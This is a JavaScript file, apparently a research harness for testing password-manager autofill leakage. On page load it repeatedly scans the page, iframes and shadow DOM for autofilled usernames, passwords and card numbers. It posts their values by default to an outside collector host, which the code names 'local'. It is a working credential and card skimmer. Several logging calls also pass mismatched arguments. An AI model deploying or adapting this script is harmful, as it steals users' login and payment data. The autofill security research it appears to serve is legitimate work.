/*
  exfiltrate.js
*/
(function () {
  // -----------------------------
  // singleton guard
  // -----------------------------
  if (window.__TP_EXFILTRATE_BOOTED__) {
    console.warn(JSON.stringify({
      ts: new Date().toISOString(),
      level: 'warn',
      source: 'exfiltrate.js',
      event: 'bootstrap_skip',
      reason: 'already_booted'
    }));
    return;
  }
  window.__TP_EXFILTRATE_BOOTED__ = true;

  const LOCAL_COLLECTOR = 'https://collector.aac-telemetry.org/collect';
  const SEND_VALUE_SAMPLE =
    (typeof window.TP_SEND_VALUE_SAMPLE === 'boolean')
      ? window.TP_SEND_VALUE_SAMPLE
      : true;
  const DEFAULT_INTERVAL = Number(window.TP_DEFAULT_INTERVAL_MS || 3000);
  const USER_TZ = 'Asia/Taipei';

  const DEFAULT_TEST_ID = (function () {
    if (window.TEST_ID) return window.TEST_ID;
    const ymd = new Date().toISOString().slice(0, 10).replace(/-/g, '');
    return 'thirdParty_sameOrigin_' + ymd;
  })();

  const SESSION_ID = (crypto?.randomUUID?.() || `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`);
  let LOG_SEQ = 0;
  let timer = null;

  // -----------------------------
  // utility
  // -----------------------------
  function parseUserAgent() {
    const ua = navigator.userAgent || '';
    let browser = 'unknown';
    if (/Edg\/(\d+\.\d+)/.test(ua)) browser = 'Edge';
    else if (/Chrome\/(\d+\.\d+)/.test(ua) && !/OPR\//.test(ua)) browser = 'Chrome';
    else if (/Firefox\/(\d+\.\d+)/.test(ua)) browser = 'Firefox';
    else if (/Safari\/(\d+\.\d+)/.test(ua)) browser = 'Safari';
    return { browser, ua };
  }

  function getLocalTs(date = new Date()) {
    return new Intl.DateTimeFormat('sv-SE', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
      timeZone: USER_TZ
    }).format(date).replace('T', ' ');
  }

  function redactValue(v) {
    if (v === undefined || v === null) return '';
    const s = String(v);
    return s.length > 200 ? s.slice(0, 200) : s;
  }

  function baseLogFields() {
    const uaInfo = parseUserAgent();
    return {
      ts: new Date().toISOString().replace(/\.\d+Z$/, 'Z'),
      local_ts: getLocalTs(),
      event: '',
      case_id: window.CASE_ID || '',
      scenario: 'in-html',
      browser: uaInfo.browser
    };
  }

  function emit(event, extra = {}) {
    const entry = {
      ...baseLogFields(),
      event,
      ...extra
    };

    console.log(JSON.stringify(entry));
  }

  // -----------------------------
  // DOM scan helpers
  // -----------------------------
  function collectAllInputs() {
    const out = [];
    out.push(...Array.from(document.querySelectorAll('input[autocomplete]')));

    const iframes = Array.from(document.querySelectorAll('iframe'));
    for (const fr of iframes) {
      try {
        const idoc = fr.contentDocument;
        if (!idoc) continue;
        const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___in_iframe = fr);
        out.push(...inputs);
      } catch (_) {}
    }

    const shadowHosts = Array.from(
      document.querySelectorAll('x-shadow-host, x-tp-shadow, x-shadow-host-thirdparty-cdn')
    );
    for (const host of shadowHosts) {
      try {
        const sr = host.shadowRoot;
        if (!sr) continue;
        const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___shadow_host = host);
        out.push(...inputs);
      } catch (_) {}
    }
    return out;
  }

  function findAutofilledInputs() {
    const inputs = collectAllInputs();
    const results = [];

    for (const inp of inputs) {
      try {
        const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
        const interesting =
          ac.includes('username') ||
          ac.includes('current-password') ||
          ac.includes('new-password') ||
          ac.includes('cc-');

        if (!interesting) continue;

        const val = inp.value || '';
        if (!val) continue;
        if (inp.dataset.exfiltrated === '1') continue;

        const container = inp.closest('[data-tech]');
        let tech = 'unknown';
        if (inp.dataset?.tech) tech = inp.dataset.tech;
        else if (container?.dataset?.tech) tech = container.dataset.tech;

        results.push({
          node: inp,
          name: inp.name || inp.id || '?',
          value: val,
          tech,
          inputType: inp.type || null,
          autocomplete: ac,
          in_iframe: !!inp.___in_iframe,
          in_shadow: !!inp.___shadow_host
        });
      } catch (err) {
        emit('warn', 'scan_field_error', {
          error: String(err)
        });
      }
    }

    return results;
  }

  // -----------------------------
  // collector
  // -----------------------------
  async function safePostLocal(envelope) {
    emit('info', 'collector_request', {
      payload_meta: {
        case_id: envelope.case_id,
        input_type: envelope.input_type,
        technique: envelope.technique
      }
    });

    try {
      const res = await fetch(LOCAL_COLLECTOR, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(envelope),
        keepalive: true
      });

      const text = await res.text().catch(() => '');

      if (!res.ok) {
        emit('error', 'collector_response_error', {
          status: res.status,
          response_text: text || ''
        });
        return { ok: false, status: res.status, text };
      }

      emit('info', 'collector_response_ok', {
        status: res.status
      });
      return { ok: true, status: res.status, text };
    } catch (e) {
      emit('error', 'collector_network_error', {
        error: String(e)
      });
      return { ok: false, status: 'network-error', err: String(e) };
    }
  }

  // -----------------------------
  // exfiltration
  // -----------------------------
  async function exfiltrateOnce() {
    const found = findAutofilledInputs();

    emit('info', 'scan_complete', {
      found_count: found.length
    });

    if (!found.length) return;

    const uaInfo = parseUserAgent();
    const caseId = window.CASE_ID || '';

    for (const f of found) {
      try {
        f.node.dataset.exfiltrated = '1';
      } catch (_) {}

      const payload = {
        timestamp: new Date().toISOString().replace(/\.\d+Z$/, 'Z'),
        local_ts: getLocalTs(),
        case_id: caseId,
        scenario: 'in-html',
        browser: uaInfo.browser,
        input_type: f.inputType || null,
        technique: f.tech || null,
        value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null
      };

      emit('info', 'autofill_detected', {
        field_name: f.name,
        input_type: f.inputType || null,
        autocomplete: f.autocomplete,
        technique: f.tech || null,
        value_length: String(f.value || '').length,
        in_iframe: f.in_iframe,
        in_shadow: f.in_shadow
      });

      await safePostLocal(payload);
    }
  }

  // -----------------------------
  // scanner lifecycle
  // -----------------------------
  function startScanning(intervalMs) {
    if (timer) {
      emit('warn', 'scanner_already_running', { interval_ms: intervalMs });
      return;
    }

    emit('info', 'scanner_start', { interval_ms: intervalMs });
    exfiltrateOnce();
    timer = setInterval(() => {
      exfiltrateOnce();
    }, intervalMs);
  }

  function stopScanning() {
    if (!timer) return;
    clearInterval(timer);
    timer = null;
    emit('info', 'scanner_stop');
  }

  // -----------------------------
  // boot
  // -----------------------------
  (document.body
    ? Promise.resolve()
    : new Promise(r => addEventListener('DOMContentLoaded', r, { once: true }))
  ).then(() => {
    if (!window.TEST_ID) window.TEST_ID = DEFAULT_TEST_ID;

    emit('info', 'bootstrap', {
      default_interval_ms: DEFAULT_INTERVAL
    });
  });

  window.addEventListener('load', () => {
    setTimeout(() => {
      startScanning(DEFAULT_INTERVAL);
    }, 1000);
  }, { once: true });

  window.addEventListener('beforeunload', () => {
    stopScanning();
  });
})();